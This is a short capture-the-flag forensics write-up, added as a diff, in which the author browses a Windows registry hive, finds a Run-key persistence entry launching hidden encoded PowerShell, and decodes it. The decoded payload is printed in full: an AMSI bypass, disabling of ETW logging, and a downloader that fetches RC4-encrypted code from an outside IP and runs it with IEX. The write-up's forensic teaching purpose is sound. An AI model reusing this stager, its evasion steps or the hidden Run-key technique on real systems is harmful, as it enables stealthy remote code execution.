@@ -1,0 +1,40 @@
+#Title: New Task
+#Difficulty: Very Easy
+#Type: Forensics
+
+First we need to download the files.
+
+```bash
+└─$ file SECURITY 
+SECURITY: MS Windows registry file, NT/2000 or above
+```
+
+To view those files we can use regshell. After checking all files I am left with software and system files and checking system returned nothing.
+
+
+regshell -F software
+
+\> cd Microsoft
+New path is: \Microsoft
+\Microsoft> cd Windows
+New path is: \Microsoft\Windows
+\Microsoft\Windows> cd CurrentVersion
+New path is: \Microsoft\Windows\CurrentVersion
+\Microsoft\Windows\CurrentVersion> cd Run
+New path is: \Microsoft\Windows\CurrentVersion\Run
+\Microsoft\Windows\CurrentVersion\Run> ls
+V "SecurityHealth" REG_EXPAND_SZ %windir%\system32\SecurityHealthSystray.exe
+V "VBoxTray" REG_EXPAND_SZ %SystemRoot%\system32\VBoxTray.exe
+V "Updater" REG_SZ "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
+\Microsoft\Windows\CurrentVersion\Run>cd ..
+\Microsoft\Windows\CurrentVersion>ls
+
+
+Debug includes a big base64 value. I used decoder to see whats that value at `https://www.base64decode.org/`. 
+
+```bash
+If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA')));$flag="HTB{4tt4ck3rS_4lw4ys_P3rs1st}";$t='/login/process.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('9Ci!QG~VXeg6s^(?3tE5y,w<=2|H)4+r');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","FYVbrz=k/UOt6R+DU5r4HakRtAr3LoUVdw=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
+```
+
+`HTB{4tt4ck3rS_4lw4ys_P3rs1st}`
+
